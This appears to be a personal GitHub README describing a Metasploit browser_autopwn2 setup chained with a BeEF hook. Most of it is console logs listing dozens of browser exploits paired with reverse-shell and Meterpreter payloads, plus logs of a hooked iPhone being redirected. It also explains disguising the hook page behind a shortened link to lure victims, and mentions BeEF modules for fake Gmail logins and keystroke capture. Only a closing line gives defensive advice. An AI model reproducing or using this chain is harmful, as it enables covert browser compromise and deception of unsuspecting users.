# metasploit_rc
My own personal metasploit files and configuations. Use with care!


# autopwn_browser.rc:

This runs 120 different known browser attacks on all devices, once an infected device makes contact then its game over. Here is after the modules have initialized:

``` Metasploit Ready
[*] Auxiliary module running as background job 0.

[*] Searching BES exploits, please wait...
msf5 auxiliary(server/browser_autopwn2) > [*] Starting exploit modules...
[*] Starting listeners...
[*] Time spent: 255.320071809
[*] Using URL: http://192.168.1.80:8080/

[*] The following is a list of exploits that BrowserAutoPwn will consider using.
[*] Exploits with the highest ranking and newest will be tried first.

Exploits
========

 Order  Rank       Name                                       Path            Payload
 -----  ----       ----                                       ----            -------
 1      Excellent  firefox_webidl_injection                   /JdNPeSseqKNaP  firefox/shell_reverse_tcp on 4442
 2      Excellent  firefox_tostring_console_injection         /ijaO           firefox/shell_reverse_tcp on 4442
 3      Excellent  firefox_svg_plugin                         /soGZt          firefox/shell_reverse_tcp on 4442
 4      Excellent  firefox_proto_crmfrequest                  /UnMWbI         firefox/shell_reverse_tcp on 4442
 5      Excellent  webview_addjavascriptinterface             /lZYBGdQSP      android/meterpreter/reverse_tcp on 4443
 6      Excellent  samsung_knox_smdm_url                      /XAwIjKeZhL     android/meterpreter/reverse_tcp on 4443
 7      Great      adobe_flash_worker_byte_array_uaf          /EZty           windows/meterpreter/reverse_tcp on 4444
 8      Great      adobe_flash_domain_memory_uaf              /cZEY           windows/meterpreter/reverse_tcp on 4444
 9      Great      adobe_flash_copy_pixels_to_byte_array      /wbAaHB         windows/meterpreter/reverse_tcp on 4444
 10     Great      adobe_flash_casi32_int_overflow            /iMcTsmjQ       windows/meterpreter/reverse_tcp on 4444
 11     Great      adobe_flash_delete_range_tl_op             /SPwTj          osx/x86/shell_reverse_tcp on 4447
 12     Great      adobe_flash_uncompress_zlib_uaf            /XgkwRihlQunYu  windows/meterpreter/reverse_tcp on 4444
 13     Great      adobe_flash_shader_job_overflow            /GFyUFSjgh      windows/meterpreter/reverse_tcp on 4444
 14     Great      adobe_flash_shader_drawing_fill            /QVBfjMKQQI     windows/meterpreter/reverse_tcp on 4444
 15     Great      adobe_flash_pixel_bender_bof               /yfZrub         windows/meterpreter/reverse_tcp on 4444
 16     Great      adobe_flash_opaque_background_uaf          /XOWNzjRr       windows/meterpreter/reverse_tcp on 4444
 17     Great      adobe_flash_net_connection_confusion       /vxkC           windows/meterpreter/reverse_tcp on 4444
 18     Great      adobe_flash_nellymoser_bof                 /gkOAg          windows/meterpreter/reverse_tcp on 4444
 19     Great      adobe_flash_hacking_team_uaf               /ucyzHgvgJocYE  windows/meterpreter/reverse_tcp on 4444
 20     Good       wellintech_kingscada_kxclientdownload      /RhGnw          windows/meterpreter/reverse_tcp on 4444
 21     Good       ms14_064_ole_code_execution                /BYViGVTFR      windows/meterpreter/reverse_tcp on 4444
 22     Good       adobe_flash_uncompress_zlib_uninitialized  /zPPnGjCqvfEu   windows/meterpreter/reverse_tcp on 4444
 23     Normal     x360_video_player_set_text_bof             /QUEUEsGmPC     windows/meterpreter/reverse_tcp on 4444
 24     Normal     ms14_012_textrange                         /xcHkHGi        windows/meterpreter/reverse_tcp on 4444
 25     Normal     ms14_012_cmarkup_uaf                       /CVlxqcePlm     windows/meterpreter/reverse_tcp on 4444
 26     Normal     ms13_090_cardspacesigninhelper             /bOVjeGeMGy     windows/meterpreter/reverse_tcp on 4444
 27     Normal     ms13_059_cflatmarkuppointer                /cUZyoGSZXR     windows/meterpreter/reverse_tcp on 4444
 28     Normal     ms13_037_svg_dashstyle                     /HatbZJiuK      windows/meterpreter/reverse_tcp on 4444
 29     Normal     ms13_022_silverlight_script_object         /VmSSgltTEFW    windows/meterpreter/reverse_tcp on 4444
 30     Normal     ie_setmousecapture_uaf                     /CRKymixRzq     windows/meterpreter/reverse_tcp on 4444
 31     Normal     firefox_smil_uaf                           /kvtHw          windows/meterpreter/reverse_tcp on 4444
 32     Normal     aladdin_choosefilepath_bof                 /lQyBmenlxSZ    windows/meterpreter/reverse_tcp on 4444
 33     Normal     advantech_webaccess_dvs_getcolor           /KwTTus         windows/meterpreter/reverse_tcp on 4444
 34     Normal     adobe_toolbutton                           /kXRGRMnVZ      windows/meterpreter/reverse_tcp on 4444
 35     Normal     adobe_flash_regex_value                    /jAwX           windows/meterpreter/reverse_tcp on 4444
 36     Normal     adobe_flash_pcre                           /FiQmsYdHyy     windows/meterpreter/reverse_tcp on 4444
 37     Normal     adobe_flash_filters_type_confusion         /SdWmxcJNqUP    windows/meterpreter/reverse_tcp on 4444
 38     Normal     adobe_flash_avm2                           /adBDQu         windows/meterpreter/reverse_tcp on 4444
 39     Manual     ie_unsafe_scripting                        /SUrJ           windows/meterpreter/reverse_tcp on 4444
 40     Manual     safari_user_assisted_download_launch       /rmhIXNy        osx/x86/shell_reverse_tcp on 4447
 41     Manual     safari_user_assisted_applescript_exec      /WcAmMpEFePWB   cmd/unix/reverse on 4446
 42     Manual     firefox_proxy_prototype                    /XcmRo          firefox/shell_reverse_tcp on 4442
 43     Manual     firefox_pdfjs_privilege_escalation         /mRDkgKpYJNy    firefox/shell_reverse_tcp on 4442

[+] Please use the following URL for the browser attack:
[+] BrowserAutoPwn URL: http://192.168.1.80:8080/
[*] Server started.

```

As you can see this bad boy is ready armed with 120 different attacks and if you've missed an update on your browser then just visiting this page you would become a victim.

## UPDATE ALL THE TIME!!!

# Our beef hit:

As you can see below the beef javascript attack allowed me to redirect my iPhone's browser to the "BrowserAutoPwn URL" listed at the bottom of the running metasploit modules:

``` beef:
[20:07:59][*] 300 modules enabled.
[20:07:59][*] 2 network interfaces were detected.
[20:07:59][*] running on network interface: 127.0.0.1
[20:07:59]    |   Hook URL: http://127.0.0.1:3000/hook.js
[20:07:59]    |_  UI URL:   http://127.0.0.1:3000/ui/panel
[20:07:59][*] running on network interface: 192.168.1.80
[20:07:59]    |   Hook URL: http://192.168.1.80:3000/hook.js
[20:07:59]    |_  UI URL:   http://192.168.1.80:3000/ui/panel
[20:07:59][*] RESTful API key: ba2cadf4152079ccbb4a3f4316c8a398874fb15b
[20:07:59][!] [GeoIP] Could not find MaxMind GeoIP database: '/var/lib/GeoIP/GeoLite2-City.mmdb'
[20:07:59]    |_  Run geoipupdate to install
[20:07:59][*] HTTP Proxy: http://127.0.0.1:6789
[20:07:59][*] BeEF server started (press control+c to stop)
[20:08:22][>] Event: User with ip 192.168.1.80 has successfully authenticated in the application.
[20:12:12][>] [INIT] Processing Browser Details...
[20:12:12][>] Event: 192.168.1.78 just joined the horde from the domain: 192.168.1.80:3000
[20:12:13][!] [Browser Details] Invalid browser plugins returned from the hook browser's initial connection.
[20:12:13][>] [INIT] Processing Browser Details...
[20:12:13][*] New Hooked Browser [id:1, ip:192.168.1.78, browser:S-6, os:iOS-], hooked domain [192.168.1.80:3000]
[20:12:13][>] Hooked browser has network interface 127.0.0.1
[20:12:13][>] Event: 192.168.1.78 appears to have come back online
[20:12:48][>] Server: mounted handler '/command/site_redirect.js'
[20:12:48][>] Hard Load module: 'site_redirect'
[20:13:03][>] Event: Hooked browser [id:1, ip:192.168.1.78] has executed instructions (status: UNKNOWN) from command module [cid:1, mod: 43, name:'Redirect Browser']
[20:13:03][*] Hooked browser [id:1, ip:192.168.1.78] has executed instructions (status: UNKNOWN) from command module [cid:1, mod: 43, name:'Redirect Browser']
[20:13:29][>] Event: Hooked browser [id:1, ip:192.168.1.78] has executed instructions (status: UNKNOWN) from command module [cid:2, mod: 43, name:'Redirect Browser']
[20:13:29][*] Hooked browser [id:1, ip:192.168.1.78] has executed instructions (status: UNKNOWN) from command module [cid:2, mod: 43, name:'Redirect Browser']
```

# After math:
The exploits will take long to run depending on your setting of the "MaxExploitCount" so if you want to be quicker its best to had pick the ones to use and not use so many.
```
[*] Server started.
[*] No cookie received for 192.168.1.78, resorting to headers hash.
[*] Gathering target information for 192.168.1.78
[*] Sending HTML response to 192.168.1.78
[*] Info receiver page called from 192.168.1.78
[*] Received cookie 'VitbVdMt' from 192.168.1.78
[*] Received sniffed browser data over POST from 192.168.1.78
{"os_vendor"=>["undefined"], "os_device"=>["iPhone"], "ua_name"=>["Safari"], "ua_ver"=>["12.0"], "arch"=>["armle"], "java"=>["null"], "silverlight"=>["false"], "flash"=>["null"], "vuln_test"=>["true"], "os_name"=>["iOS"]}.
[-] Target 192.168.1.78 has requested an unknown path: /favicon.ico
[*] Received cookie 'VitbVdMt' from 192.168.1.78
[*] Serving exploit to user 192.168.1.78 with tag VitbVdMt
[*] Setting target "VitbVdMt" to :tried.
[*] Received cookie 'VitbVdMt' from 192.168.1.78
[*] User 192.168.1.78 (Tag: VitbVdMt) visited our malicious link, but no exploits found suitable.
[*] 192.168.1.78     firefox_webidl_injection - Received cookie 'vvZkOBNUtskSfbOXHT' from 192.168.1.78
[*] 192.168.1.78     firefox_webidl_injection - Received cookie 'vvZkOBNUtskSfbOXHT' from 192.168.1.78
[*] 192.168.1.78     firefox_webidl_injection - Serving exploit to user 192.168.1.78 with tag vvZkOBNUtskSfbOXHT
[*] 192.168.1.78     firefox_webidl_injection - Setting target "vvZkOBNUtskSfbOXHT" to :tried.
[*] 192.168.1.78     firefox_webidl_injection - Comparing requirement: source=script vs source=script
[*] 192.168.1.78     firefox_webidl_injection - Comparing requirement: ua_name=Firefox vs ua_name=Safari
[*] 192.168.1.78     firefox_webidl_injection - Comparing requirement: ua_ver=#<Proc:0x000055d93d2bdad8@/usr/share/metasploit-framework/modules/exploits/multi/browser/firefox_webidl_injection.rb:59 (lambda)> vs ua_ver=undefined
[!] 192.168.1.78     firefox_webidl_injection - Exploit requirement(s) not met: ua_name, ua_ver. For more info: http://r-7.co/PVbcgx
[*] 192.168.1.78     adobe_flash_worker_byte_array_uaf - Received cookie 'vvZkOBNUtskSfbOXHT' from 192.168.1.78
[*] 192.168.1.78     adobe_flash_worker_byte_array_uaf - Received cookie 'vvZkOBNUtskSfbOXHT' from 192.168.1.78
[*] 192.168.1.78     adobe_flash_worker_byte_array_uaf - Serving exploit to user 192.168.1.78 with tag vvZkOBNUtskSfbOXHT
[*] 192.168.1.78     adobe_flash_worker_byte_array_uaf - Setting target "vvZkOBNUtskSfbOXHT" to :tried.
[*] 192.168.1.78     adobe_flash_worker_byte_array_uaf - Comparing requirement: source=(?i-mx:script|headers) vs source=script
[*] 192.168.1.78     adobe_flash_worker_byte_array_uaf - Comparing requirement: os_name=#<Proc:0x00007f44b83c6348@/usr/share/metasploit-framework/modules/exploits/windows/browser/adobe_flash_worker_byte_array_uaf.rb:43 (lambda)> vs os_name=iOS
[*] 192.168.1.78     adobe_flash_worker_byte_array_uaf - Comparing requirement: ua_name=#<Proc:0x00007f44b83c6320@/usr/share/metasploit-framework/modules/exploits/windows/browser/adobe_flash_worker_byte_array_uaf.rb:47 (lambda)> vs ua_name=Safari
[*] 192.168.1.78     adobe_flash_worker_byte_array_uaf - Comparing requirement: flash=#<Proc:0x00007f44b83c62d0@/usr/share/metasploit-framework/modules/exploits/windows/browser/adobe_flash_worker_byte_array_uaf.rb:48 (lambda)> vs flash=
[*] 192.168.1.78     adobe_flash_worker_byte_array_uaf - Comparing requirement: arch=x86 vs arch=armle
[!] 192.168.1.78     adobe_flash_worker_byte_array_uaf - Exploit requirement(s) not met: os_name, ua_name, flash, arch. For more info: http://r-7.co/PVbcgx

```

# Unfortantly for now I was unable to successfully exploit and get a meterpreter shell into my latest iOS version iPhone... Let try this same technique on a Windows laptop or Linux

# First let's say we've embedded our beef attack into a website or just simply tricked someone into click a link.


# my evil link: https://tinyurl.com/nwbgmv2

# Doesn't look evil right? I used tiny url to turn: http://192.168.1.80:3000/demos/basic.html into https://tinyurl.com/nwbgmv2

# But both go to the same place!

# I will be demo'ing this with screenshots so you can actually see what is happening:

# The link the tiny URL sent our browser was to our beef attack page:
![](https://cloudtsgroup.com/hit1.png)

# This shows out IP even along with the iPhone from earlier, however our laptop is still "hooked"!
![](https://cloudtsgroup.com/hit2.png)


# Now lets just look at all the evil we can do here, the white circles means the attack probably will not work, the red ones means there are chances it will alert our victim and the green means no sign of detection.
![](https://cloudtsgroup.com/hit3.png)


# I'm going to show you other things we can do from here such as pose as gmail and trick you to login, get your keystrokes but the purpose of this module is to redirect you to our metasploit! Then we will have complete system level access... Feel free to check out all the other different modules, You can even write your own:
![](https://cloudtsgroup.com/hit_beef_firefox.png)
![](https://cloudtsgroup.com/hit4.png)
![](https://cloudtsgroup.com/hit5.png)
![](https://cloudtsgroup.com/hit6.png)
![](https://cloudtsgroup.com/hit7.png)
![](https://cloudtsgroup.com/hit8.png)

# As you can see we are wanting to redirect our victims browser to are payload, You shouldn't have 120 payloads running like I did because this is only a way to help anyone who doesn't understand it. Imagine if I had that one that hasn't been discovered... It would be so fast we wouldn't even see it redirect.

![](https://cloudtsgroup.com/auto1.png)
![](https://cloudtsgroup.com/auto2.png)
![](https://cloudtsgroup.com/auto_re.png)

# To prevent this from ever happening who to be to disable javascript however this will break alot of sites. I would recommend enabling it by a case by case bases depending on the site because even those little fast popups could be trying to do something as simple as this and you would never know

